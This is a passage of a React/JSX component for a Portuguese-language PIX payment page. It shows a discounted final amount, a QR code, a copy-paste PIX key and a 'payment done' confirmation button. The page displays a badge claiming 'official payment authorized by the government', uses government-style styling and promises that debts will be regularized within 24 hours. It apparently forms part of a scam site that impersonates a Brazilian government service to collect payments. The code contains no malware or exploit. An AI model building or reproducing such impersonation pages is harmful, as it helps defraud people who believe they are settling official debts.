                    -{paymentData.economia.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                  </span>
                </div>
                <div className="flex items-center justify-between pt-2 border-t border-gray-200">
                  <span className="font-bold text-[#071D41]">Valor Final:</span>
                  <span className="text-xl md:text-2xl font-bold text-[#D4000F]">
                    {paymentData.valorFinal.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* PIX Payment Section */}
          <div className="mb-4 md:mb-6">
            <div className="bg-gradient-to-br from-[#F0F5FF] to-white p-6 md:p-8 border-2 border-[#1351B4] rounded-lg shadow-lg">
              {/* Header with Official Badge */}
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center bg-gradient-to-r from-[#1351B4] to-[#0D47A1] text-white px-6 py-2 rounded-full mb-4 shadow-lg">
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                    />
                  </svg>
                  <span className="font-bold text-sm">Pagamento Oficial Autorizado pelo Governo</span>
                </div>
                <h2 className="text-2xl md:text-3xl font-bold text-[#071D41] mb-2">Pague com PIX</h2>
                <p className="text-3xl md:text-4xl font-bold text-[#1351B4] mb-2">
                  {paymentData.valorFinal.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                </p>
              </div>

              {/* QR Code Section - Desktop Only */}
              <div className="hidden md:flex justify-center mb-6">
                <div className="bg-white p-6 rounded-lg shadow-lg">
                  <img
                    src={pixData?.qr_code_image || "/placeholder.svg"} // Use optional chaining for safety
                    alt="QR Code PIX"
                    className="w-64 h-64 mx-auto"
                    onError={(e) => {
                      console.error("[v0] Erro ao carregar QR Code:", pixData?.qr_code_image)
                      e.currentTarget.src = "/placeholder.svg"
                    }}
                  />
                  <p className="text-center text-sm text-[#555555] mt-3">Escaneie o QR Code com o app do seu banco</p>
                </div>
              </div>

              {/* PIX Key Section - Both Mobile and Desktop */}
              <div className="bg-white p-6 rounded-lg border-2 border-[#1351B4] shadow-md mb-6">
                <div className="flex items-center justify-center mb-4">
                  <svg className="w-6 h-6 text-[#1351B4] mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1z"
                    />
                  </svg>
                  <h3 className="text-xl font-bold text-[#071D41]">
                    <span className="hidden md:inline">ou </span>Chave PIX Copia e Cola
                  </h3>
                </div>

                <div className="bg-[#F8F8F8] p-4 rounded-lg border-2 border-gray-300 mb-4">
                  <p className="text-sm md:text-base font-mono text-[#333333] break-all text-center leading-relaxed">
                    {pixData?.qr_code || "Gerando chave PIX..."}{" "}
                    {/* Show loading state if pixData is not yet available */}
                  </p>
                </div>

                <button
                  onClick={handleCopyPIX}
                  disabled={!pixData?.qr_code} // Disable button if no QR code
                  className="w-full bg-gradient-to-r from-[#1351B4] to-[#0D47A1] text-white py-5 px-6 rounded-xl hover:from-[#0D47A1] hover:to-[#1351B4] transition-all transform hover:scale-105 active:scale-95 font-bold text-lg md:text-xl flex items-center justify-center shadow-2xl border-2 border-[#1351B4] disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {copied ? (
                    <>
                      <svg
                        className="w-7 h-7 mr-3 animate-bounce"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                      </svg>
                      <span>Chave PIX Copiada!</span>
                    </>
                  ) : (
                    <>
                      <svg className="w-7 h-7 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2.5}
                          d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
                        />
                      </svg>
                      <span>Copiar Chave PIX</span>
                    </>
                  )}
                </button>
              </div>

              {/* Instructions */}
              <div className="bg-[#FFFAEA] p-4 rounded-lg border-l-4 border-[#FFCC29]">
                <h4 className="font-bold text-[#071D41] text-sm mb-3 flex items-center">
                  <svg className="w-5 h-5 text-[#FF9100] mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  Como pagar:
                </h4>
                <ol className="space-y-2 text-sm text-[#333333]">
                  <li className="flex items-start">
                    <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                      1
                    </span>
                    <span>Copie a chave PIX acima clicando no botão</span>
                  </li>
                  <li className="flex items-start">
                    <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                      2
                    </span>
                    <span>Abra o aplicativo do seu banco</span>
                  </li>
                  <li className="flex items-start">
                    <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                      3
                    </span>
                    <span>
                      Acesse a área de <strong>PIX</strong> e selecione <strong>Pix Copia e Cola</strong>
                    </span>
                  </li>
                  <li className="flex items-start">
                    <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                      4
                    </span>
                    <span>Cole a chave PIX e confirme o pagamento</span>
                  </li>
                </ol>
              </div>
            </div>
          </div>

          {/* Confirmação de Pagamento - More compact on mobile */}
          <div className="bg-[#E8F5E8] p-4 md:p-6 mb-4 md:mb-6 border-2 border-[#4CAF50] rounded-lg shadow-md">
            <h2 className="text-base md:text-lg font-bold text-[#071D41] mb-2 md:mb-4 flex items-center">
              <svg
                className="w-5 h-5 md:w-6 md:h-6 mr-2 text-[#4CAF50]"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              Confirmação de Pagamento
            </h2>
            <p className="text-xs md:text-sm text-[#333333] mb-3 md:mb-4">
              Após realizar o pagamento PIX, clique no botão abaixo para confirmar.
            </p>
            <button
              onClick={handlePaymentConfirmation}
              disabled={isConfirming || paymentStatus === "checking" || paymentStatus === "paid"} // Disable if already confirming, checking, or paid
              className="w-full bg-[#1351B4] text-white py-3 md:py-4 px-4 md:px-6 rounded-lg hover:bg-[#0D47A1] transition-all transform hover:scale-105 font-bold text-sm md:text-base flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
            >
              {isConfirming ? (
                <>
                  <div className="animate-spin rounded-full h-5 w-5 md:h-6 md:w-6 border-b-2 border-white mr-2 md:mr-3"></div>
                  Processando...
                </>
              ) : paymentStatus === "checking" ? (
                <>
                  <div className="animate-spin rounded-full h-5 w-5 md:h-6 md:w-6 border-b-2 border-white mr-2 md:mr-3"></div>
                  Verificando Pagamento...
                </>
              ) : paymentStatus === "paid" ? (
                <>
                  <svg
                    className="w-5 h-5 md:w-6 md:h-6 mr-2 md:mr-3"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  Pagamento Realizado
                </>
              ) : (
                <>
                  <svg
                    className="w-5 h-5 md:w-6 md:h-6 mr-2 md:mr-3"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  Realizei o Pagamento
                </>
              )}
            </button>
          </div>

          {/* Payment Status Banner */}
          {pixData && ( // Render this section only if pixData is available
            <div className="w-full max-w-6xl mx-auto bg-white rounded-lg shadow-lg p-4 md:p-8 border-2 border-[#1351B4]">
              {/* Payment Success Banner */}
              {paymentStatus === "paid" && (
                <div className="mb-6 bg-green-50 border-2 border-green-500 rounded-lg p-4 md:p-6">
                  <div className="flex items-center gap-3 mb-2">
                    <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                      />
                    </svg>
                    <h3 className="text-xl md:text-2xl font-bold text-green-700">Pagamento Confirmado!</h3>
                  </div>
                  <p className="text-green-700 font-medium">
                    Seu pagamento foi aprovado com sucesso. Os débitos serão regularizados em até 24 horas.
                  </p>
                </div>
              )}

              {/* Payment Checking Banner */}
              {paymentStatus === "checking" && (
                <div className="mb-4 bg-blue-50 border border-blue-300 rounded-lg p-3 flex items-center gap-2">
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                  <p className="text-sm text-blue-700">Aguardando confirmação do pagamento...</p>
                </div>
              )}

              <h2 className="text-xl md:text-2xl font-bold text-[#071D41] mb-6 text-center">PIX Gerado com Sucesso!</h2>
            </div>
          )}

          {/* Botão Voltar - More compact on mobile */}
          <div className="flex justify-start">
            <button
              type="button"
              onClick={handleVoltar}
              disabled={isGeneratingPix || isConfirming || paymentStatus === "checking"} // Disable if generating, confirming, or checking
              className="bg-[#EDEDED] text-[#071D41] py-2 md:py-3 px-4 md:px-6 rounded-sm hover:bg-[#DDDDDD] focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-2 transition-colors font-medium flex items-center disabled:opacity-50 disabled:cursor-not-allowed text-sm md:text-base"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-4 w-4 mr-2"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
              Voltar
            </button>
          </div>
        </div>

        <div className="mt-4 md:mt-6">
          <SecurityBadge />
        </div>
      </div>
      <Footer />
    </main>
  )
}
